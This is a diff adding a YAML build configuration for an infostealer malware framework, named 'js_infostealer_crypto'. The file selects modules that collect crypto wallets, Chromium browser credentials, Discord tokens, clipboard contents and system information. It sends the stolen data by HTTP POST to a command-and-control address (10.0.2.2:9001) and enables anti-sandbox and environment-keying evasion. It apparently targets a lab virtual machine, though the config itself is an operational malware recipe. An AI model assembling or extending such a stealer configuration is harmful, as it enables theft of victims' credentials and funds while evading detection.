@@ -1,0 +1,26 @@
+name: js_infostealer_crypto
+description: Targeted crypto wallet and credential stealer
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/crypto_wallets
+  - collectors/browser_chromium
+  - collectors/discord_tokens
+  - collectors/clipboard
+
+exfil: exfil/http_post
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/env_keying
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
